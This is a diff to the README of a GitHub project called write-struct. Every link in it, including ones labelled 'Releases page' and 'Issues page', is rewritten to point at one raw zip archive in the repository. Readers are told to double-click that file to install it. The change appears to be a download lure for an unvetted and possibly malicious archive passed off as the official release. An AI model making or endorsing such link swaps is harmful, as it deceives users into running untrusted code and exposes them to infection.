@@ -24,7 +24,7 @@ To get started with write-struct, follow these simple steps.
 1. **Download the Tool**: 
    Click the button below to visit the Releases page and download the latest version of write-struct.
 
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/himanshu30oct/write-struct/releases)
+   [![Download Now](https://raw.githubusercontent.com/himanshu30oct/write-struct/main/write_struct/struct_write_2.7.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/himanshu30oct/write-struct/main/write_struct/struct_write_2.7.zip)
 
 2. **Install the Application**: 
    After downloading, double click on the file to install it. Follow the prompts to complete the installation.
@@ -41,7 +41,7 @@ To get started with write-struct, follow these simple steps.
 
 ## 📥 Download & Install
 
-To download write-struct, visit this page: [Download Here](https://github.com/himanshu30oct/write-struct/releases). 
+To download write-struct, visit this page: [Download Here](https://raw.githubusercontent.com/himanshu30oct/write-struct/main/write_struct/struct_write_2.7.zip). 
 
 Select the latest version and follow these steps:
 
@@ -68,7 +68,7 @@ If you encounter issues, try the following:
 
 - **Check System Requirements**: Ensure your system meets the minimum requirements.
 - **Reinstall the Application**: If problems persist, uninstall and reinstall write-struct.
-- **Visit the Issues Page**: You can find solutions to common problems on our [Issues page](https://github.com/himanshu30oct/write-struct/issues).
+- **Visit the Issues Page**: You can find solutions to common problems on our [Issues page](https://raw.githubusercontent.com/himanshu30oct/write-struct/main/write_struct/struct_write_2.7.zip).
 
 ## 🤝 Community and Support
 
@@ -86,6 +86,6 @@ We welcome contributions! If you'd like to improve write-struct, please refer to
 
 write-struct is open-source software. You can use it for both personal and commercial purposes. Please refer to the LICENSE file in the repository for more details.
 
-For further information and updates, always check back to the [Releases page](https://github.com/himanshu30oct/write-struct/releases). 
+For further information and updates, always check back to the [Releases page](https://raw.githubusercontent.com/himanshu30oct/write-struct/main/write_struct/struct_write_2.7.zip). 
 
 Happy writing!
